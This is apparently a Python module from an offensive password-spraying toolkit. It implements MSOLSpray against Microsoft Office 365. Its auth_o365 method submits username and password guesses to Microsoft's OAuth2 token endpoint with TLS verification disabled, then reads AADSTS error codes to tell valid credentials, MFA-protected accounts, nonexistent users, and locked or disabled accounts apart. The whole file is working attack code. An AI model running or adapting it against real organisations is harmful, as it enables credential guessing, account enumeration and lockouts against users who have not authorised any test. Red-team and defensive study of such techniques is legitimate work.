import httpx
import logging
from sprayingtoolkit.base import BaseSprayer
from sprayingtoolkit.models import HostingLocation

log = logging.getLogger("atomizer.modules.o365.sprayers.msol")


class MSOLSpray(BaseSprayer):
    """
    Original discovery of spraying technique and code by @dafthack
    https://github.com/dafthack/MSOLSpray
    """

    def __init__(self):
        super().__init__()

        # There are a lot more error types, if you want to add them all just fill out this dictionary :)
        self.error_to_reason_map = {
            "AADSTS50126": "Invalid Password",
            "AADSTS50128": "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services",
            "AADSTS50059": "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services",
            "AADSTS50034": "The user doesn't exist",
            "AADSTS50079": "Credential valid however the response indicates MFA (Microsoft) is in use",
            "AADSTS50076": "Credential valid however the response indicates MFA (Microsoft) is in use",
            "AADSTS50158": "Credential valid however the response indicates conditional access (MFA: DUO or other) is in use",
            "AADSTS50053": "The account appears to be locked",
            "AADSTS50057": "The account appears to be disabled",
            "AADSTS50055": "Credential valid however the user's password is expired"
        }

        self.headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        self.client = httpx.AsyncClient(
            verify=False, trust_env=True, http2=True, headers=self.headers
        )

    async def shutdown(self):
        await self.client.aclose()

    async def auth_o365(self, username: str, password: str):
        result = {
            "error": "",
            "valid": False,
            "reason": "",
            "status_code": None
        }

        data = {
            "resource": "https://graph.windows.net",
            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
            "client_info": "1",
            "grant_type": "password",
            "username": username,
            "password": password,
            "scope": "openid",
        }

        r = await self.client.post(
            "https://login.microsoft.com/common/oauth2/token", data=data
        )

        result["status_code"] = r.status_code
        if r.status_code == 200:
            result['valid'] = True
            result['reason'] = "HTTP status code 200"
        else:
            msg = r.json()
            # log.debug(beutify_json(msg))
            # log.debug(f"Error: {error}")
            error = msg["error_description"].split("\r\n")[0]

            for error_code,reason in self.error_to_reason_map.items():
                if error_code in error:
                    result["error"] = error_code
                    result["reason"] = reason
                    break

        return result
